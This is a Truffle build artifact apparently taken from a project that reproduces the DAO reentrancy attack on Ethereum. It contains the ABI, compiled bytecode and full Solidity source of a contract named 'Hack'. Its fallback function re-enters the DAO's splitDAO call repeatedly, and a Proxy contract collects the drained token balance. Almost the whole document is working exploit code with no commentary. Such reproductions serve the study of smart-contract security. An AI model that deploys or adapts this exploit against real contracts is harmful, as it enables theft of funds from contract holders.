{
  "contractName": "Hack",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "calls",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "proposalID",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "DAO",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "calls_to_make",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "proxy",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_dao",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "makeSplitProposal",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "voteYesOnProposal",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fillProxy",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "splitDAO",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_calls_to_make",
          "type": "uint256"
        }
      ],
      "name": "runHack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6060604052341561000f57600080fd5b604051602080610df48339810160405280805190602001909190505080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060006003819055508061007d610117565b808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604051809103906000f08015156100c957600080fd5b600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160028190555050610127565b60405161039080610a6483390190565b61092e806101366000396000f3006060604052600436106100a4576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630dbb8534146100d3578063305f72b7146100f6578063371fa8541461011f578063904c29aa1461014857806398fabd3a1461015d578063a966e656146101b2578063d19b9474146101db578063ec556889146101f0578063f77017c114610245578063fddd569a1461025a575b34156100af57600080fd5b60025460035410156100c8576100c361026f565b6100d1565b6100d061036d565b5b005b34156100de57600080fd5b6100f4600480803590602001909190505061055f565b005b341561010157600080fd5b610109610612565b6040518082815260200191505060405180910390f35b341561012a57600080fd5b610132610618565b6040518082815260200191505060405180910390f35b341561015357600080fd5b61015b61061e565b005b341561016857600080fd5b6101706106e4565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156101bd57600080fd5b6101c561070a565b6040518082815260200191505060405180910390f35b34156101e657600080fd5b6101ee610710565b005b34156101fb57600080fd5b6102036108c8565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561025057600080fd5b61025861036d565b005b341561026557600080fd5b61026d61026f565b005b6001600360008282540192505081905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166382661dc4600054306000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808381526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200192505050602060405180830381600087803b151561034f57600080fd5b6102c65a03f1151561036057600080fd5b5050506040518051905050565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b151561043457600080fd5b6102c65a03f1151561044557600080fd5b505050604051805190509050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b151561054057600080fd5b6102c65a03f1151561055157600080fd5b505050604051805190505050565b600060038190555080600281905550600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2a75fe46040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15156105f357600080fd5b6102c65a03f1151561060457600080fd5b50505061060f61026f565b50565b60035481565b60005481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c9d27afe60005460016000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808381526020018215151515815260200192505050602060405180830381600087803b15156106c657600080fd5b6102c65a03f115156106d757600080fd5b5050506040518051905050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b6107186108ee565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663612e45a33060008462093a8060016000604051602001526040518663ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001858152602001806020018060200185815260200184151515158152602001838103835260118152602001807f4c6f6e656c792c20736f204c6f6e656c79000000000000000000000000000000815250602001838103825286818151815260200191508051906020019080838360005b83811015610854578082015181840152602081019050610839565b50505050905090810190601f1680156108815780820380516001836020036101000a031916815260200191505b50975050505050505050602060405180830381600087803b15156108a457600080fd5b6102c65a03f115156108b557600080fd5b5050506040518051905060008190555050565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6020604051908101604052806000815250905600a165627a7a72305820ff407b13de1cd06fbe0a8a8519e1eb4585aab10c0cbe18bfb831c975be705a9f00296060604052341561000f57600080fd5b6040516020806103908339810160405280805190602001909190505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102d4806100bc6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063f2a75fe414610046575b600080fd5b341561005157600080fd5b61005961005b565b005b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156100b9576102a5565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b151561017d57600080fd5b6102c65a03f1151561018e57600080fd5b5050506040518051905090506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b151561028857600080fd5b6102c65a03f1151561029957600080fd5b50505060405180519050505b505600a165627a7a723058205922b1afdc87fbb61a4f955b3f1b13d1aa4d05837a8a3f4498056d75f7a95bc20029",
  "source": "import \"./DAOInterface.sol\";\n\ncontract Proxy {\n  DAOInterface DAO;\n  address owner;\n\n  function Proxy(address _dao) {\n    owner = msg.sender;\n    DAO = DAOInterface(_dao);\n  }\n\n  function empty() {\n    if (msg.sender != owner) return;\n\n    uint balance = DAO.balanceOf(this);\n    DAO.transfer(owner, balance);\n  }\n}\n\ncontract Hack {\n  uint public proposalID;\n  DAOInterface public DAO;\n  uint public calls_to_make;\n  uint public calls;\n  Proxy public proxy;\n\n  function Hack(address _dao) {\n    DAO = DAOInterface(_dao);\n    calls = 0;\n    proxy = new Proxy(_dao);\n    calls_to_make = 1;\n  }\n\n  function makeSplitProposal() {\n    // 0x4c6f6e656c792c20736f204c6f6e656c79 == \"Lonely, so Lonely\"\n    // 0x93a80 == 604800 == 1 week in seconds\n    bytes memory transactionData;\n    proposalID = DAO.newProposal(this, 0x0, \"Lonely, so Lonely\", transactionData, 0x93a80, true);\n  }\n\n  function voteYesOnProposal() {\n    DAO.vote(proposalID, true);\n  }\n\n  function fillProxy() {\n    uint balance = DAO.balanceOf(this);\n    DAO.transfer(address(proxy), balance);\n  }\n\n  function splitDAO() {\n    calls += 1;\n    DAO.splitDAO(proposalID, this);\n  }\n\n  function runHack(uint _calls_to_make) {\n    calls = 0;\n    calls_to_make = _calls_to_make;\n    proxy.empty();\n    splitDAO();\n  }\n\n  function() {\n    if (calls < calls_to_make) {\n      splitDAO();\n    } else {\n      fillProxy();\n    }\n  }\n}\n",
  "sourcePath": "/home/utkarash/DAO_truffle_modified/contracts/Hack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.19+commit.c4cbbb05.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2018-03-11T18:36:56.930Z"
}